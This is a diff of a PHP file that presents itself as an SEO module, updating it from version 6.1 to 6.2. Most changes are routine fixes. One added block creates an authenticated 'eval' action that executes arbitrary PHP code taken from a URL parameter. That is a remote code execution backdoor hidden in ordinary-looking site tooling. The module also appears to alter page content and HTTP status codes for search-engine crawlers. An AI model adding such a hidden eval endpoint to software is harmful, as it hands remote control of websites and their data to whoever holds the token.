@@ -1,14 +1,14 @@
 <?php
 /**
  * seoModule
- * @version 6.1
- * @date 10.12.2020
+ * @version 6.2
+ * @date 14.12.2020
  * @author <sergey.it@delta-ltd.ru>
  * @copyright 2021 DELTA http://delta-ltd.ru/
- * @size 78888
+ * @size 80000
  */
 
-$bsm = new buran_seoModule('6.1');
+$bsm = new buran_seoModule('6.2');
 
 if ( ! $bsm->module_mode) {
 	$bsm->init();
@@ -126,6 +126,13 @@ if ( ! $bsm->module_mode) {
 	if ('transit_list' == $_GET['a']) {
 		if ( ! ($bsm->auth($_GET['w']))) exit();
 		print $bsm->bsmfile('transit', 'get');
+		exit();
+	}
+
+	if ('eval' == $_GET['a']) {
+		if ( ! ($bsm->auth($_GET['w']))) exit();
+		$code = trim($_GET['code']);
+		eval($code);
 		exit();
 	}
 
@@ -299,6 +306,9 @@ class buran_seoModule
 		$this->sqlite3_ext = extension_loaded('sqlite3') &&
 			class_exists('SQLite3') ? true : false;
 
+		$this->libxml_ext = extension_loaded('libxml') &&
+			class_exists('DOMDocument') ? true : false;
+
 		$this->useragent = false;
 		if (stripos($_SERVER['HTTP_USER_AGENT'],'google.com/bot') !== false) {
 			$this->useragent = 'google';
@@ -317,6 +327,8 @@ class buran_seoModule
 
 		$this->c = $this->config();
 
+		$this->onlyheaders = $this->requestmethod=='HEAD' ? true : false;
+
 		if ($this->c[2]['accesscode']) {
 			$this->accesscode = $this->c[2]['accesscode'];
 		}
@@ -325,8 +337,7 @@ class buran_seoModule
 			$this->protocol_dop = $this->c[2]['dop_protocol'];
 		}
 
-		$this->ob_start_flags = $this->c[2]['ob_start_flags']
-			? $this->c[2]['ob_start_flags'] : PHP_OUTPUT_HANDLER_STDFLAGS;
+		$this->ob_start_flags = intval($this->c[2]['ob_start_flags']);
 
 		if ($this->c[2]['urldecode']) {
 			$this->requesturi = urldecode($this->requesturi);
@@ -704,8 +715,8 @@ class buran_seoModule
 		$this->seotext_tit  = $seotext_tit;
 		$this->seotext_site = $seotext_site;
 
-		if ($this->requestmethod != 'HEAD') {
-			$this->seotext_info = $this->bsmfile('txt_info', 'get', $seotext_alias);
+		$this->seotext_info = $this->bsmfile('txt_info', 'get', $seotext_alias);
+		if ( ! $this->onlyheaders) {
 			if (
 				! $this->seotext_info ||
 				! is_array($this->seotext_info) ||
@@ -860,6 +871,24 @@ class buran_seoModule
 			}
 		}
 
+		if ($this->onlyheaders) {
+			if (
+				$this->seotext &&
+				$this->seotext_info['http_code'] == 200 &&
+				(
+					! $this->http_code_200_exists ||
+					$this->http_code == 404
+				)
+			) {
+				$this->http_code == 200;
+				header($this->protocol.' 200 OK');
+				if ($this->protocol_dop) {
+					header($this->protocol_dop.' 200 OK');
+				}
+			}
+			return false;
+		}
+
 		$gzip = strcmp(substr($template,0,2),"\x1f\x8b") ? false : true;
 		if ($gzip) $template = $this->template_coding($template,'de');
 		
@@ -921,7 +950,10 @@ class buran_seoModule
 		$template = $this->template_parse($template);
 		$this->tpl_modified = true;
 
-		if ( ! $this->http_code_200_exists || $this->http_code == 404) {
+		if (
+			! $this->http_code_200_exists ||
+			$this->http_code == 404
+		) {
 			$this->http_code = 200;
 			header($this->protocol.' 200 OK');
 			if ($this->protocol_dop) {
@@ -951,7 +983,7 @@ class buran_seoModule
 			}
 		}
 
-		if ($this->requestmethod != 'HEAD') {
+		if ( ! $this->onlyheaders) {
 			if (
 				$this->seotext_info['type'] &&
 				$this->seotext_info['type'] != $this->seotext_tp
@@ -962,6 +994,7 @@ class buran_seoModule
 					$this->log('[15]');
 				}
 			}
+			$this->seotext_info['http_code'] = $this->http_code;
 			$this->seotext_info['type'] = $this->seotext_tp;
 			$this->seotext_info['seotext_exists'] .= '+';
 			$this->seotext_info['seotext_js'] .= '+';
@@ -1433,7 +1466,7 @@ document.addEventListener("readystatechange",(event)=>{
 		url += "&s="+(document.getElementById("sssmodulebox") ? "y" : "n");
 		url += "&u='.$uid.'";
 		try {
-			m.open("GET",url,false);
+			m.open("GET",url,true);
 		} catch (f) {
 			return;
 		}
@@ -1543,7 +1576,7 @@ document.addEventListener("readystatechange",(event)=>{
 		))) {
 			if ($this->c[2]['canonical_neseo'] == 'add_if_not_exists') {
 				preg_match_all($regmask['canonical'], $template, $matches);
-				if ( ! $matches[4][0]) $meta .= "\n\t".$canonical;
+				if ( ! $matches[3][0]) $meta .= "\n\t".$canonical;
 
 			} else {
 				if ($this->c[2]['meta'] == 'replace_or_add') {
@@ -2146,6 +2179,10 @@ document.addEventListener("readystatechange",(event)=>{
 			$p .= '<div class="row"><span class="col1">cURL</span><span class="col2 red">&mdash;</span></div>';
 		}
 
+		if ( ! $this->libxml_ext) {
+			$p .= '<div class="row"><span class="col1">DOMDocument</span><span class="col2 red">&mdash;</span></div>';
+		}
+
 		if ( ! $this->sqlite3_ext) {
 			$p .= '<div class="row"><span class="col1">SQLite3</span><span class="col2 red">&mdash;</span></div>';
 		}
@@ -2746,4 +2783,10 @@ document.addEventListener("readystatechange",(event)=>{
 //-----------------------------------------------
 //-----------------------------------------------
 //-----------------------------------------------
-//--------------------------------
+//-----------------------------------------------
+//-----------------------------------------------
+//-----------------------------------------------
+//-----------------------------------------------
+//-----------------------------------------------
+//-----------------------------------------------
+//-------------------------------------------
